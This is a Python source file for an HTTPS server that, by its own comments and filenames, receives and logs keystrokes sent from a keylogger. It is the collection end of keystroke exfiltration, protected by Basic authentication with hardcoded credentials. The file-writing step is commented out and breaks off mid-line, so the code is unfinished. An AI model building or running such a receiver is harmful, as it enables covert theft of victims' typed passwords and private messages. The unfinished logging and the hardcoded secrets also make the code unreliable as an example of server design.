# generate server.pem with the following command:
#    openssl req -new -x509 -keyout key.pem -out server.pem -days 365 -nodes
# run as follows:
#    python httpsServer.py
# The server will run off of 
#    https://0.0.0.0:8080
# 0.0.0.0 denotes all network interfaces
import http.server
import ssl
import cgi
import base64
from datetime import datetime


# Constants for USERNAME and PASSWORD
USERNAME = 'mayuri'
PASSWORD = 'tuturu'

class MyRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):

        auth_header = self.headers.get('Authorization') 
        if not self.authenticate(auth_header):
            # We will include authentication so random people do not upload to our server
            self.send_response(401) # Respond with 401, unauthorized
            self.send_header('WWW-Authenticate', 'Basic realm="Authentication required"')
            self.end_headers()
            self.wfile.write(b'Unauthorized') # return "unauthorized"
            return

        self.send_response(200) # Respond with 200 OK

        # set response headers
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        # Get the post data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(b'You sent: ' + post_data)
        current_datetime = datetime.now()
        timestamp_str = current_datetime.strftime("%Y-%m-%dT%H:%M:%S")
        filename = f"keystrokes_{timestamp_str}.txt" # Future improvement: collect hostname with keylogger, send the host name to generate logs.

        #log_file = open(

    def authenticate(self, auth_header):
        if auth_header:
            # if there is an "Authorization" Header
            try:
                auth_type, encoded = auth_header.split(' ')
                if auth_type.lower() == 'basic':
                    decoded = base64.b64decode(encoded).decode('utf-8')
                    username, password = decoded.split(':')
                    return username == USERNAME and password == PASSWORD
            except (ValueError, UnicodeDecodeError):
                pass
        return False


server_address = ('0.0.0.0', 8080)
httpd = http.server.HTTPServer(server_address, MyRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket,
                               server_side=True,
                               certfile="server.pem",
                               keyfile="key.pem",
                               ssl_version=ssl.PROTOCOL_TLS)
httpd.serve_forever()
